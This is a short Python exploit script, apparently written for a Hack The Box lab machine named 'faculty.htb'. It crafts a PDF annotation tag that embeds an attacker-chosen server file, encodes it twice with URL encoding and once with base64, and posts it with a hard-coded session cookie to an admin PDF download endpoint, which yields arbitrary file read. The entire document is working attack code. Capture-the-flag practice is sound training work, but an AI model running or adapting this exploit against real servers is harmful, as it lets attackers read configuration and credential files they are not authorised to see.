#!/usr/bin/env python3

from base64 import b64encode
from urllib.parse import quote
import requests

def generate_payload(file_name):
	payload = f'<annotation file="{file_name}" content="{file_name}" icon="Graph" title="Attached File: {file_name}" pos-x="195" />'
	# Double URL Encode & Base64 Encode:
	encoded_payload = b64encode(quote(quote(payload)).encode("ascii")).decode("ascii")
	return encoded_payload

def exploit(payload, url, path):
	r = requests.post(url + path, data={
		"pdf": payload
		}, cookies={
		"PHPSESSID":"l31dj9gukrtn7a82dah5higvsj"
		})
	return r

if __name__ == "__main__":
	url = "http://faculty.htb"
	path = "/admin/download.php"

	fname = input("Enter file name:\n")
	payload = generate_payload(fname)
	r = exploit(payload, url, path)
	print(r.text)